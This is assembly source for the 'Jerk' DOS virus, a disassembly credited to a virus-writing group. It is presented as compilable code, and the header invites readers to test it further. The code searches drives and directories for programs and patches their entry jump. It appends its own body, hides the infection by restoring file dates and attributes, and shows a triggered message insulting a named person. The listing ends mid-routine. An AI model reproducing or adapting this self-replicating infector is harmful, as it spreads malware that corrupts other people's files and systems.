  
PAGE  59,132
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             JERK VIRUS                               ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                           Disassembly by                             ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                         DecimatoR / SKISM                            ÛÛ
;ÛÛ NOTE: Although this code compiles with TASM 2.0, it may not function ÛÛ
;ÛÛ       in the same manner as the original virus.  Test it further.    ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
data_1e         equ     446h                    ; (009D:0446=10h)
data_2e         equ     2Ch                     ; (8344:002C=0)
data_3e         equ     80h                     ; (8344:0080=0)
data_22e        equ     55Ch                    ; (8344:055C=0)
  
seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a
  
  
                org     100h
  
super           proc    far
  
start:
                call    sub_1                   ; (010A)
                dec     bp
;*              jnz     loc_3                   ;*Jump if not zero
                db       75h, 72h
                jo      loc_2                   ; Jump if overflow=1
                jns     $-6Eh                   ; Jump if not sign
  
super           endp
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1           proc    near
                jmp     short loc_1             ; (0115)
                db      0CDh, 20h
data_7          dw      9090h, 9090h, 9090h
                db      90h
loc_1:
                cld                             ; Clear direction
                pushf                           ; Push flags
                call    sub_2                   ; (0132)
                call    sub_6                   ; (01B1)
                call    sub_4                   ; (0188)
                call    sub_28                  ; (0491)
                call    sub_27                  ; (041B)
                call    sub_5                   ; (01A0)
                popf                            ; Pop flags
                pop     bp
                mov     bp,100h
                push    bp
                xor     bp,bp                   ; Zero register
                retn
sub_1           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_2           proc    near
                call    sub_3                   ; (017E)
                mov     ax,3524h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     di,offset ds:[4F4h]     ; (8344:04F4=79h)
                mov     [bp+di],bx
                mov     [bp+di],es
                push    cs
                pop     es
                mov     ax,2524h
                mov     dx,offset int_24h_entry
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                mov     ax,3301h
                xor     dl,dl                   ; Zero register
                int     21h                     ; DOS Services  ah=function 33h
                                                ;  ctrl-break flag al=off/on
                mov     si,offset ds:[10Bh]     ; (8344:010B=9)
                add     si,bp
                mov     cx,9
                mov     di,offset ds:[100h]     ; (8344:0100=0E8h)
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                mov     ah,1Ah
                mov     dx,offset data_21       ; (8344:053E=0)
                add     dx,bp
                mov     [bp+294h],dx
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                mov     ah,19h
loc_2:
                int     21h                     ; DOS Services  ah=function 19h
                                                ;  get default drive al  (0=a:)
                mov     [bp+4F8h],al
                mov     bx,0FFFFh
                mov     [bp+53Ch],bx
                retn
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_3:
                pop     bp
                push    bp
                sub     bp,134h
sub_2           endp
  
  
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;
;                       External Entry Point
;
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
  
int_24h_entry   proc    far
                retn
int_24h_entry   endp
  
                db       32h,0C0h,0CFh
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_4           proc    near
                mov     ah,1Ah
                mov     dx,data_3e              ; (8344:0080=0)
                int     21h                     ; DOS Services  ah=function 1Ah
                                                ;  set DTA to ds:dx
                call    sub_7                   ; (01DF)
                mov     ax,2524h
                mov     si,offset ds:[4F4h]     ; (8344:04F4=79h)
                lds     dx,dword ptr [bp+si]    ; Load 32 bit ptr
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                call    sub_5                   ; (01A0)
                retn
sub_4           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_5           proc    near
                push    cs
                pop     ds
                push    cs
                pop     es
                xor     ax,ax                   ; Zero register
                xor     bx,bx                   ; Zero register
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                xor     si,si                   ; Zero register
                xor     di,di                   ; Zero register
                retn
sub_5           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_6           proc    near
                call    sub_7                   ; (01DF)
                xor     ah,ah                   ; Zero register
                mov     cx,ax
                mov     dh,al
  
locloop_4:
                or      dl,dl                   ; Zero ?
                jnz     loc_5                   ; Jump if not zero
                mov     dl,dh
loc_5:
                call    sub_8                   ; (01E8)
                dec     dl
                jnc     loc_6                   ; Jump if carry=0
                loop    locloop_4               ; Loop if cx > 0
  
                jmp     short loc_ret_8         ; (01DE)
loc_6:
                dec     cx
                jz      loc_7                   ; Jump if zero
                call    sub_9                   ; (021F)
                jnc     loc_ret_8               ; Jump if carry=0
                call    sub_7                   ; (01DF)
                call    sub_8                   ; (01E8)
                jc      loc_ret_8               ; Jump if carry Set
loc_7:
                call    sub_9                   ; (021F)
  
loc_ret_8:
                retn
sub_6           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7           proc    near
                mov     ah,0Eh
                mov     dl,[bp+4F8h]
                int     21h                     ; DOS Services  ah=function 0Eh
                                                ;  set default drive dl  (0=a:)
                retn
sub_7           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8           proc    near
                push    cx
                push    dx
                mov     ah,36h                  ; '6'
                int     21h                     ; DOS Services  ah=function 36h
                                                ;  get free space, drive dl,1=a:
                cmp     ax,0FFFFh
                je      loc_10                  ; Jump if equal
                mul     cx                      ; dx:ax = reg * ax
                mul     bx                      ; dx:ax = reg * ax
                cmp     ax,800h
                jae     loc_9                   ; Jump if above or =
                or      dx,dx                   ; Zero ?
                jz      loc_10                  ; Jump if zero
loc_9:
                pop     dx
                push    dx
                dec     dl
                mov     ah,0Eh
                int     21h                     ; DOS Services  ah=function 0Eh
                                                ;  set default drive dl  (0=a:)
                mov     ah,5Bh                  ; '['
                xor     cx,cx                   ; Zero register
                mov     dx,offset data_15+3     ; (8344:04FF=0)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 5Bh
                                                ;  create new file, name @ ds:dx
                jc      loc_11                  ; Jump if carry Set
                mov     ah,41h                  ; 'A'
                int     21h                     ; DOS Services  ah=function 41h
                                                ;  delete file, name @ ds:dx
                jmp     short loc_11            ; (021C)
loc_10:
                stc                             ; Set carry flag
loc_11:
                pop     dx
                pop     cx
                retn
sub_8           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9           proc    near
                call    sub_13                  ; (0297)
                mov     ah,3Bh                  ; ';'
                mov     dx,offset ds:[4F9h]     ; (8344:04F9=2)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                call    sub_10                  ; (0232)
                call    sub_14                  ; (02AB)
                retn
sub_9           endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_10          proc    near
                call    sub_11                  ; (025E)
                jc      loc_ret_14              ; Jump if carry Set
                call    sub_13                  ; (0297)
                call    sub_18                  ; (02EE)
                jnc     loc_13                  ; Jump if carry=0
                call    sub_15                  ; (02B8)
                jc      loc_13                  ; Jump if carry Set
loc_12:
                mov     ah,3Bh                  ; ';'
                mov     dx,data_22e             ; (8344:055C=0)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                call    sub_10                  ; (0232)
                jnc     loc_13                  ; Jump if carry=0
                call    sub_14                  ; (02AB)
                call    sub_16                  ; (02D7)
                jnc     loc_12                  ; Jump if carry=0
loc_13:
                call    sub_12                  ; (027C)
  
loc_ret_14:
                retn
sub_10          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_11          proc    near
                mov     di,[bp+294h]
                cmp     di,0FA00h
                cmc                             ; Complement carry
                jc      loc_ret_15              ; Jump if carry Set
                add     di,offset ds:[100h]     ; (8344:0100=0E8h)
                mov     [bp+294h],di
                mov     si,offset data_21       ; (8344:053E=0)
                add     si,bp
                mov     cx,80h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
  
loc_ret_15:
                retn
sub_11          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_12          proc    near
                pushf                           ; Push flags
                mov     si,[bp+294h]
                sub     si,100h
                xchg    si,[bp+294h]
                mov     di,offset data_21       ; (8344:053E=0)
                add     di,bp
                mov     cx,80h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                popf                            ; Pop flags
                retn
sub_12          endp
  
                db      0F1h, 69h
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_13          proc    near
                mov     di,[bp+294h]
                add     di,data_3e              ; (8344:0080=0)
                mov     al,5Ch                  ; '\'
                stosb                           ; Store al to es:[di]
                mov     ah,47h                  ; 'G'
                mov     si,di
                xor     dl,dl                   ; Zero register
                int     21h                     ; DOS Services  ah=function 47h
                                                ;  get present dir,drive dl,1=a:
                retn
sub_13          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_14          proc    near
                mov     ah,3Bh                  ; ';'
                mov     dx,[bp+294h]
                add     dx,data_3e              ; (8344:0080=0)
                int     21h                     ; DOS Services  ah=function 3Bh
                                                ;  set current dir, path @ ds:dx
                retn
sub_14          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_15          proc    near
                mov     cx,12h
                mov     dx,offset ds:[4FBh]     ; (8344:04FB=0)
                call    sub_20                  ; (0343)
                jc      loc_ret_18              ; Jump if carry Set
                call    sub_17                  ; (02E0)
loc_16:
                jc      loc_ret_18              ; Jump if carry Set
                mov     al,2Eh                  ; '.'
                cmp     al,[bp+55Ch]
                jne     loc_17                  ; Jump if not equal
                call    sub_16                  ; (02D7)
                jmp     short loc_16            ; (02C6)
loc_17:
                clc                             ; Clear carry flag
  
loc_ret_18:
                retn
sub_15          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_16          proc    near
                call    sub_21                  ; (034A)
                jc      loc_ret_19              ; Jump if carry Set
                call    sub_17                  ; (02E0)
  
loc_ret_19:
                retn
sub_16          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_17          proc    near
                mov     cl,10h
loc_20:
                test    cl,[bp+553h]
                jnz     loc_ret_21              ; Jump if not zero
                call    sub_21                  ; (034A)
                jnc     loc_20                  ; Jump if carry=0
  
loc_ret_21:
                retn
sub_17          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_18          proc    near
                push    word ptr [bp+4EAh]
                mov     dx,offset data_15+0Dh   ; (8344:0509=0)
                xor     al,al                   ; Zero register
                call    sub_19                  ; (0313)
                jnc     loc_22                  ; Jump if carry=0
                mov     dx,offset data_15+19h   ; (8344:0515=0)
                xor     al,al                   ; Zero register
                call    sub_19                  ; (0313)
                jnc     loc_22                  ; Jump if carry=0
                mov     dx,offset data_15+1Fh   ; (8344:051B=0)
                mov     al,0FFh
                call    sub_19                  ; (0313)
loc_22:
                pop     word ptr [bp+4EAh]
                retn
sub_18          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_19          proc    near
                mov     [bp+4EAh],al
                mov     cx,23h
                call    sub_20                  ; (0343)
                jc      loc_ret_27              ; Jump if carry Set
                mov     cx,3
loc_23:
                loop    locloop_24              ; Loop if cx > 0
  
                stc                             ; Set carry flag
                retn
  
locloop_24:
                call    sub_22                  ; (034F)
                jc      loc_25                  ; Jump if carry Set
                call    sub_25                  ; (03A9)
                jc      loc_25                  ; Jump if carry Set
                call    sub_26                  ; (03DF)
                jmp     short loc_26            ; (033E)
loc_25:
                call    sub_23                  ; (0371)
                call    sub_21                  ; (034A)
                jnc     loc_23                  ; Jump if carry=0
                retn
loc_26:
                call    sub_23                  ; (0371)
                clc                             ; Clear carry flag
  
loc_ret_27:
                retn
sub_19          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_20          proc    near
                mov     ah,4Eh                  ; 'N'
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 4Eh
                                                ;  find 1st filenam match @ds:dx
                retn
sub_20          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_21          proc    near
                mov     ah,4Fh                  ; 'O'
                int     21h                     ; DOS Services  ah=function 4Fh
                                                ;  find next filename match
                retn
sub_21          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_22          proc    near
                push    cx
                xor     ax,ax                   ; Zero register
                cmp     ax,[bp+55Ah]
                jb      loc_28                  ; Jump if below
                mov     ax,0F000h
                cmp     ax,[bp+558h]
                jb      loc_28                  ; Jump if below
                mov     ax,9
                cmp     [bp+558h],ax
                jb      loc_28                  ; Jump if below
                mov     cl,0
                call    sub_24                  ; (039C)
loc_28:
                pop     cx
                retn
sub_22          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_23          proc    near
                push    cx
                mov     bx,[bp+53Ch]
                cmp     bx,0FFFFh
                je      loc_29                  ; Jump if equal
                mov     ax,5701h
                mov     cx,[bp+554h]
                mov     dx,[bp+556h]
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                mov     ah,3Eh                  ; '>'
                int     21h                     ; DOS Services  ah=function 3Eh
                                                ;  close file, bx=file handle
                mov     bx,0FFFFh
                mov     [bp+53Ch],bx
loc_29:
                mov     cl,[bp+553h]
                call    sub_24                  ; (039C)
                pop     cx
                retn
sub_23          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_24          proc    near
                mov     ax,4301h
                xor     ch,ch                   ; Zero register
                mov     dx,data_22e             ; (8344:055C=0)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                retn
sub_24          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_25          proc    near
                push    cx
                mov     dx,data_22e             ; (8344:055C=0)
                add     dx,bp
                mov     ax,3D02h
                int     21h                     ; DOS Services  ah=function 3Dh
                                                ;  open file, al=mode,name@ds:dx
                jc      loc_30                  ; Jump if carry Set
                mov     [bp+53Ch],ax
                mov     dx,offset ds:[10Bh]     ; (8344:010B=9)
                add     dx,bp
                mov     cx,9
                mov     bx,ax
                mov     ah,3Fh                  ; '?'
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                mov     cx,6
                mov     si,offset ds:[4EEh]     ; (8344:04EE=0)
                add     si,bp
                mov     di,offset data_7        ; (8344:010E=90h)
                add     di,bp
                repe    cmpsb                   ; Rep zf=1+cx >0 Cmp [si] to es:[di]
                jnz     loc_31                  ; Jump if not zero
                stc                             ; Set carry flag
loc_30:
                pop     cx
                retn
loc_31:
                clc                             ; Clear carry flag
                pop     cx
                retn
sub_25          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_26          proc    near
                mov     di,offset ds:[4ECh]     ; (8344:04EC=0E8h)
                add     di,bp
                mov     ax,[bp+558h]
                sub     ax,3
                stosw                           ; Store ax to es:[di]
                mov     ax,4200h
                mov     bx,[bp+53Ch]
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                mov     ah,40h                  ; '@'
                mov     cx,9
                mov     dx,offset data_9        ; (8344:04EB=0)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                mov     ah,40h                  ; '@'
                mov     cx,435h
                mov     dx,offset ds:[109h]     ; (8344:0109=90h)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                retn
sub_26          endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_27          proc    near
                mov     ah,2Ah                  ; '*'
                int     21h                     ; DOS Services  ah=function 2Ah
                                                ;  get date, cx=year, dx=mon/day
                test    dl,3
                jnz     loc_ret_33              ; Jump if not zero
                mov     ah,2Ch                  ; ','
                int     21h                     ; DOS Services  ah=function 2Ch
                                                ;  get time, cx=hrs/min, dh=sec
                test    dh,3
                jnz     loc_ret_33              ; Jump if not zero
                mov     cx,47h
                mov     si,data_1e              ; (009D:0446=10h)
                add     si,bp
                mov     di,si
  
locloop_32:
                lodsb                           ; String [si] to al
                sub     al,80h
                stosb                           ; Store al to es:[di]
                loop    locloop_32              ; Loop if cx > 0
  
                mov     ah,9
                mov     dx,data_1e              ; (009D:0446=10h)
                add     dx,bp
                int     21h                     ; DOS Services  ah=function 09h
                                                ;  display char string at ds:dx
  
loc_ret_33:
data_8          db      'Craig Murphy calls himself SUPER'
                db      'HACKER but he''s just a talentle'
                db      'ss Jerk!', 0Dh, 0Ah, '$'
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_28:
                mov     al,0FFh
                cmp     al,[bp+4EAh]
                je      loc_34                  ; Jump if equal
                retn
loc_34:
                push    word ptr ds:data_2e     ; (8344:002C=0)
                pop     es
                xor     di,di                   ; Zero register
                mov     al,1
loc_35:
                scasb                           ; Scan es:[di] for al
                jnz     loc_35                  ; Jump if not zero
                inc     di
                push    es
                pop     ds
                mov     dx,di
